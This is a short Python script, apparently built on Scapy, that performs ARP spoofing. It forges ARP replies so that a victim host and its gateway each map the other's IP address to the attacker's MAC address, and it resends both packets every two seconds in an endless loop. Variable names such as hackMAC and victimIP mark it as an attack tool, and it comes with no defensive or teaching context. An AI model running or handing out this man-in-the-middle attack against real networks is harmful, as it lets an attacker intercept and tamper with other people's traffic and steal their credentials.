def main():
    gatewayIP="x.x.x.x"#[gateway]
    victimIP="x.x.x.x"#[target ip]
    
    hackMAC="x:x:x:x:x:x"
    victimMAC="00:11:22:??:??:??"
    gatewayMAC=""
    
   # print(getmacbyip("x.x.x.x"))#get its mac
    packet1=Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2=Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC,hwdst=gatewayMAC,psrc=victimIP,pdst=gatewayIP,op=2)
    
    
    
    while 1:
        sendp(packet1,iface="eth0",verbose=False)
        sendp(packet2,iface="eth0",verbose=False)
        time.sleep(2)
        print(packet1.show())
        print(packet2.show())
   
main()
 